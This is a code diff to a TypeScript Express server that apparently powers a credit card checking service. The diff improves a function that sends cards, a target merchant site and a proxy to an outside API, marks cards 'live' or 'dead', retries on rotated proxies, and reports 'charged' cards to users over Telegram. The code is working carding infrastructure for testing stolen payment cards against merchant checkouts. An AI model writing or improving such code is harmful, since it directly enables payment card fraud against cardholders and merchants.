@@ -157,7 +157,7 @@ export async function registerRoutes(
     job.rejected = 0;
   };
 
-  // ✅ NEW API-based card checker
+  // ✅ FIXED API-based card checker
   const checkCardWithAPI = async (card: string, siteUrl: string, proxy: string, userId: number, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string, gateway?: string}> => {
     try {
       const job = getUserJob(userId);
@@ -171,21 +171,44 @@ export async function registerRoutes(
         queryUrl += `&proxy=${encodeURIComponent(proxy)}`;
       }
 
-      onLog(`Checking card...`);
-      const response = await fetch(queryUrl);
+      onLog(`Checking...`);
+      
+      const response = await fetch(queryUrl, {
+        method: 'GET',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        }
+      });
 
       if (!response.ok) {
-        throw new Error(`API error: ${response.status}`);
+        throw new Error(`API status ${response.status}`);
       }
 
-      const data: any = await response.json();
-      const status = data.Status?.toLowerCase() === 'live' ? 'live' : 'dead';
+      const text = await response.text();
+      if (!text) {
+        throw new Error('Empty response');
+      }
+
+      let data;
+      try {
+        data = JSON.parse(text);
+      } catch (parseErr) {
+        throw new Error(`Invalid JSON: ${text.substring(0, 100)}`);
+      }
+
+      // Map Status field correctly
+      const statusStr = data.Status || data.status || '';
+      const status = statusStr.toLowerCase() === 'live' ? 'live' : 'dead';
+      const message = data.Response || data.response || 'Unknown';
+      
+      onLog(`Result: ${status.toUpperCase()}`);
       
       return {
         status,
-        message: data.Response || 'Unknown',
-        price: data.Price,
-        gateway: data.Gateway,
+        message,
+        price: data.Price || data.price,
+        gateway: data.Gateway || data.gateway,
       };
     } catch (e: any) {
       onLog(`Error: ${e.message}`);
@@ -300,6 +323,7 @@ export async function registerRoutes(
           if (result.status === 'error' && !job.shouldStop) {
             const retryProxyIndex = (proxyIndex + 1) % (proxies.length || 1);
             const retryProxy = proxies[retryProxyIndex] || currentProxy;
+            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Retrying...`, type: 'warn' } });
             await new Promise(r => setTimeout(r, 2000));
             result = await checkCardWithAPI(cardStr, targetUrl, retryProxy, userId, onLog);
           }
@@ -346,7 +370,7 @@ export async function registerRoutes(
               : targetUrl;
             
             sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged', {
-              brand: result.gateway,
+              brand: result.gateway || 'Unknown',
               type: 'CREDIT',
               country: 'US',
               countryCode: 'US'
@@ -400,7 +424,7 @@ export async function registerRoutes(
         charged: chargedCount,
         rejected: rejectedCount
       }});
-      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Finished! ${processedCount}/${allCards.length} processed. Charged: ${chargedCount} | Declined: ${rejectedCount}`, type: 'info' } });
+      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `✅ Finished! ${processedCount}/${allCards.length} | Charged: ${chargedCount} | Declined: ${rejectedCount}`, type: 'info' } });
     }
   };
 
@@ -576,7 +600,6 @@ export async function registerRoutes(
   app.post('/api/proxies/test', authMiddleware, async (req: AuthRequest, res) => {
     try {
       const { proxy } = req.body;
-      // Simple test - just check if it's formatted correctly
       const parts = proxy.split(':');
       const isValid = parts.length >= 2 && parts[0] && parts[1];
       res.json({ isValid });
@@ -627,7 +650,6 @@ export async function registerRoutes(
   });
 
   app.post(api.credits.add.path, authMiddleware, async (req: AuthRequest, res) => {
-    // Admin only
     if (!req.user!.isAdmin) {
       return res.status(403).json({ error: 'Admin only' });
     }
@@ -751,7 +773,6 @@ export async function registerRoutes(
     }
   });
 
-  // Telegram webhook
   app.post('/api/telegram/webhook', async (req, res) => {
     try {
       const update = req.body;
@@ -762,12 +783,10 @@ export async function registerRoutes(
     }
   });
 
-  // Health check
   app.get('/health', (req, res) => {
     res.json({ status: 'ok' });
   });
 
-  // Initialize Telegram bot
   initBot();
 
   return httpServer;
